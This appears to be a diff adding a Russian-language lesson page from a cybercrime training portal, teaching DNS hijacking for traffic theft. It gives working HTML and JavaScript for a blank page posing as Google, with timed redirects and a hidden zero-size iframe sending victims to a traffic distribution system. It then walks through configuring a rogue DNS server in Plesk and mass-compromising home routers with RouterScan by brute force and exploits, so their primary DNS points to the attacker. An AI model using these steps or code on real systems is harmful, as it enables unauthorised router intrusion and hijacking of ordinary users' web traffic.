@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="source/favicon.ico" type="image/x-icon">
+    <title>Уроки | University 2.0</title>
+    <link rel="stylesheet" href="source/main.css">
+    <link rel="stylesheet" href="source/style.css">
+
+    <link rel="stylesheet" href="source/tikets.css">
+    <link rel="stylesheet" href="source/profile_window.css">
+
+    <link rel='stylesheet' href="source/default.css">
+    <link rel='stylesheet' href="source/idea.css">
+    <script type="text/javascript" src="source/highlight.pack.js"></script>
+</head>
+<body>
+
+
+    <div id="myfond_gris" opendiv=""></div>
+    <div align="center" style="padding-top:35px;">
+        <div id="box_1" class="mymagicoverbox_fenetre" style="left:-225px; width:450px;">
+            Anon | 00500
+            <div class="mymagicoverbox_fenetreinterieur" style="height:220px; ">
+                <div align="left">
+                    <p class="lead">Имя пользователя: Anon</p>
+                    <p class="lead">Статус: Активен</p>
+                    <p class="lead">Регистрация jabber: <a target="_blank" href="http://plast.cash/registration.php?key="></a></p>
+                    <p class="lead">Поток: Anon</p>
+                    <p class="lead">TG канал: <a target="_blank" href="">Канал для опретивных оповещений</a></p>
+                    
+                    <br><br>
+                    <div style="width:100px" align="center" class="mymagicoverbox_fermer">Закрыть</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+<div class="main_container">
+    <header>
+        <a href="index.html"><img class="logo" src="source/logo.png" alt="University 2.0"></a>
+        <div class="header_right">
+            <div class="user_info">
+                <p>Hello,
+                <a href="#" iddiv="box_1" class="mymagicoverbox"> Anon </a>
+
+
+                </p>
+                <p>ID: 00500</p>
+            </div>
+            <div class="user_actions">
+                <a href="help.html"
+                   class="btn btn_gray btn_transparent btn_border_transparent btn_icon btn_icon_help">Помощь</a>
+                
+                    
+                    <a href="index.html" class="btn  btn_round btn_status btn_status_active btn_gray btn_exit">Выход</a>
+                
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <nav>
+            <a href="index.html" class="btn btn_icon btn_icon_dashboard ">Сводка</a>
+            <a href="lections.html" class="btn btn_icon btn_icon_book active">Лекции</a>
+            <a href="index.html" class="btn btn_icon btn_icon_group ">Тикеты</a>
+            <a href="faq.html" class="btn btn_icon btn_icon_chat ">FAQ</a>
+        </nav>
+        <div class="content">
+
+<a href="hack.html">       
+    <div class="banner_block" style="background-image:url('source/hack_9X2ouwy.jpg')">
+        <div class="banner_content">
+            <h2>Хак</h2>
+            <p>Лучшая защита - это нападение.</p>
+        </div>
+    </div>
+    </a>
+    <br>
+
+            
+
+            
+    <div class="article_actions">
+        <a href="hack.html" class="btn btn_round btn_gray  btn_icon btn_icon_back ">Назад</a>
+    </div>
+
+
+ <div class="text_content">
+        <p style="text-align:left">DNS (Система Доменных Имен) - это система предоставляющая возможность узнать ип адрес ресурса по доменному имени. Когда ты вводишь в адресной строке браузера `ok.ru`, первым делом браузер отправляет запрос на получение ип адреса куда нужно отправить пакет. Можно создать свой днс сервер и указать его в параметрах подключения, тогда запросы будут отправляться ему. Схема резолвинга доменного имени такова: DNS кеш -&gt; Системный файл hosts -&gt; DNS сервер указанный в параметрах подключения.</p>
+
+<p style="text-align:left">Т.е. DNS нужен для того, чтобы хранить базу соответствия между IP-адресами и доменными именами. Эта система преобразует как доменные имена в IP-адреса, так и осуществляет обратное преобразование - из IP-адреса в доменное имя. Адрес DNS-сервера может прописываться в настройках подключения к интернету. Он может выдаваться автоматически. Если сервер DNS по какой-то причине вышел из строя, то соединение с интернетом не пострадает, но ни одно доменное имя не сможет быть преобразовано в IP-адрес. Проще говоря, при наборе доменного имени любого сайта в браузере, пользователю будет выдаваться ошибка.</p>
+
+<p style="text-align:left">Итог:</p>
+
+<ul>
+    <li style="text-align:left">Нам нужна ТДС</li>
+    <li style="text-align:left">Фишинговый сайт в котором будет скрипт редиректа с ожиданием.<br />
+    Сайт, конечно же, должен быть популярный. Это значит, что обращается к адресу данного сайта наш пользователь должен очень часто. К примеру: google, yahoo и тому подобное.</li>
+    <li style="text-align:left">Панель сервера DNS при помощи которого будет осуществляется переход пользователя на сайт с редиректом.</li>
+    <li style="text-align:left">Маршрутизаторы с которых будем сливать трафик.<br />
+    Для этого будем использовать RouterScan Mass.</li>
+</ul>
+
+<h3 style="text-align:left"><strong>Сайт</strong></h3>
+
+<p style="text-align:left">Будем использовать обычную пустую страничку, на которой будет задержка в 5 секунд. Этого достаточно для того, чтобы слить трафик на партнерку. В общем случае нам протребуется 2 сткрипта.</p>
+
+<p style="text-align:left">Вот пример первого скрипта:</p>
+
+<div>
+<pre>
+<code class="language-html">&lt;script language="JavaScript"&gt;
+
+
+  var limit="0:3" // время в формате минуты : секунды
+
+  if (document.images){
+
+    var parselimit=limit.split(":");
+
+    parselimit=parselimit[0]*60+parselimit[1]*1
+
+  }
+
+  function timerstart(){
+
+    if (!document.images)
+
+      return
+
+    if (parselimit==1)
+
+      window.location="https://www.google.co.uk/" // куда перекинуть
+
+    else{
+
+      parselimit-=1;
+
+      setTimeout("timerstart()",1000)
+
+    }
+
+  }
+
+&lt;/script&gt;</code></pre>
+</div>
+
+<p style="text-align:left">И второго:</p>
+
+<div>
+<pre>
+<code class="language-html">&lt;script type="text/javascript"&gt;
+
+  setTimeout(function(){
+
+  location="https://www.google.co.uk/";
+
+  }, 5000);
+
+&lt;/script&gt;</code></pre>
+</div>
+
+<p style="text-align:left">Сама страница полностью пустая, чтоб выглядеть как обычное окно, ожидающее вывода сайта. Вот готовый пример для страницы гугла:</p>
+
+<div>
+<pre>
+<code class="language-html">&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Google&lt;/title&gt;
+    &lt;link rel="shortcut icon" href="/images/favicon.png" type="image/png"&gt;
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;
+    &lt;style type="text/css"&gt;
+    body {
+        background-color: #FAFDFF;
+        margin: 0px;
+        padding: 0px;
+        font-size: 12px;
+        color: #000;
+        font-family: Georgia, Helvetica, sans-serif;
+    }
+    b {
+        color: #00008B
+    }
+    .promo {
+        color: #AF0032;
+        font-size: 12px;
+        text-align: center;
+        margin-top: 20px
+    }
+    .promo a:link, .promo a:visited, .promo a:hover {
+        color: #0066CC;
+        text-decoration: underline;
+    }
+    &lt;/style&gt;
+&lt;/head&gt;
+    &lt;script type="text/javascript"&gt;
+        var limit = "0:3"
+        if ( document.images ){
+            var parselimit = limit.split(":")
+            parselimit = parselimit[0] * 60 + parselimit[1] * 1
+        }
+        function timerstart(){
+            if ( !document.images )
+                return
+            if ( parselimit == 1 )
+                window.location = "https://www.google.co.uk/"
+            else{
+                parselimit -= 1
+                setTimeout("timerstart()", 1000)
+            }
+        }
+    &lt;/script&gt;
+    &lt;script type="text/javascript"&gt; 
+        setTimeout(function(){ location = "https://www.google.co.uk/"; }, 5000);
+    &lt;/script&gt;
+&lt;body onLoad="timerstart()"&gt;
+    &lt;iframe width="0" height="0" frameborder="0" src="http://url/to/tds"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+</div>
+
+<p style="text-align:left">Так же в данную страницу встраиваем iframe (или скрипт) для слива на ТДС, это можно увидеть в коде примера</p>
+
+<div>
+<pre>
+<code class="language-html">&lt;iframe width="0" height="0" frameborder="0" src="http://url/to/tds"&gt;&lt;/iframe&gt;</code></pre>
+</div>
+
+<p style="text-align:left">Ну и конечно же, устанавливаем иконку гугла для вкладки, чтобы пользователь думал что чего от него ждет.</p>
+
+<h3 style="text-align:left"><strong>Панель DNS</strong></h3>
+
+<p style="text-align:left">Для начала требуется регистрация собственного DNS сервера, например https://www.cloudns.net/private-dns-servers/lang/ru/. Трафик сливается по средством попадания пользователя на ресурс, где скрыт скрипт на систему распределения трафика (ТДС) или напрямую в какую-либо партнерку. В данной теме рассмотрим панель Plesk - hosting panel. Предполагая, что ты приобретешь себе сервер с панелью управлением типа Plesk. Если у тебя будет другая панель, то разберешься по аналогии. Переходим в панель.</p>
+
+<p style="text-align:left"><a href="source/plesk.png"><img alt="" src="source/plesk.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">Затем открываем управление доменами и выбираем добавить домен. Как видишь у меня уже добавлен домен google для слива трафика.</p>
+
+<p style="text-align:left"><a href="source/2plesk.png"><img alt="" src="source/2plesk.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">В меню добавления доменов, вписываем домен, который часто посещает пользователь, при этом у данного домена должны быть и другие зоны помимо com. Это нужно чтобы скрипт редиректа перекинул пользователя именно на настоящий сайт, но в другой зоне. Почему? Потому что зону com занял ты своим фейком. На странице примера в коде, увидишь, что скрипт перекидывает пользователя на тот же гугл, но в другой доменной зоне. Добавим домен:</p>
+
+<p style="text-align:left"><a href="source/3plesk.png"><img alt="" src="source/3plesk.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">При добавлении домена нужно указать пользователя, который будет управлять этим доменом. После заполнения всех пунктов и добавления домена, будет выдан днс сервер. Посмотреть его можно нажав на созданный домен в разделе домены, где ты попадешь в меню настроек и других действий с сайтом. В этих настройках перейди в настройки DNS:</p>
+
+<p style="text-align:left"><a href="source/5plesk.png"><img alt="" src="source/5plesk.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">В настройках ДНС берешь ИП адрес сервера:</p>
+
+<p style="text-align:left"><a href="source/6plesk.png"><img alt="" src="source/6plesk.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">Запись &quot;А&quot;, это твой ДНС сервер, который необходимо указать в парметрах для подмены сайта google. Ну и конечно же, нужно залить на сервер файлы фейка:</p>
+
+<p style="text-align:left"><a href="source/7plesk.png"><img alt="" src="source/7plesk.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left"><a href="source/8plesk.png"><img alt="" src="source/8plesk.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">Всё! Фейк ДНС готов.</p>
+
+<h3 style="text-align:left"><strong>Собираем роутеры</strong></h3>
+
+<p style="text-align:left">Теперь нужно данный фейковый днс, установить на взломанных роутерах как первичный DNS и тогда пользователь при вводе в браузер адрес сайта google.com будет попадать на твой фейк. Да, и обязательно вторичный днс нужно указать настоящий, например от google это 8.8.4.4 или 8.8.8.8. Это сделать нужно обязательно. Потому что при поиске других сайтов, которых на нашем днс нет, будет обращение ко вторичному серверу для поиска этих доменов, а если его не будет, то и сайты не будут открываться, кроме нашего фейка.</p>
+
+<p style="text-align:left">Итак, займемся поиском роутеров, для подмены ДНС. Для этого будем использовать Route Scan. Запускаем сканер:</p>
+
+<p style="text-align:left"><a href="source/route.png"><img alt="" src="source/route.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">Теперь нужно добавить диапазоны и выбрать функцию брута роутеров и взлом эксплойтами, которые входят в набор данного софта. Дианазоны можно взять например <a href="https://www.countryipblocks.net/country_selection.php" target="_blank">тут</a>. В комплекте также идет инструкция на русском в которой все подробно расписано.</p>
+
+<p style="text-align:left"><a href="source/2route.png"><img alt="" src="source/2route.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">Вбив диапазоны, жми старт и жди результатов.</p>
+
+<p style="text-align:left"><a href="source/GOOD-SCAN-Router.png"><img alt="" src="source/GOOD-SCAN-Router.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">После того как у тебя будут доступы, топай в настройки роутера и ставь им первичный днс.</p>
+
+<p style="text-align:left"><a href="source/3route.png"><img alt="" src="source/3route.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">После перехода в админку роутера, моделей которых куча и настройки у всех расположены по-разному. Ищи в настройках где указывается ДНС сервера и вставляй в первичный днс адрес своего сервера.</p>
+
+<p style="text-align:left"><a href="source/4route.png"><img alt="" src="source/4route.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:left">Сохрани настройки и всё. Теперь пользователь, при попытке попасть на сайт google, будет перенаправлен на твой фейк, где произойдёт слив трафика и редирект.</p>
+    </div>
+    <br>
+
+
+ 
+        </div>
+    </div>
+</div>
+<footer>
+    <p>University 2.0</p>
+</footer>
+
+</body>
+</html>
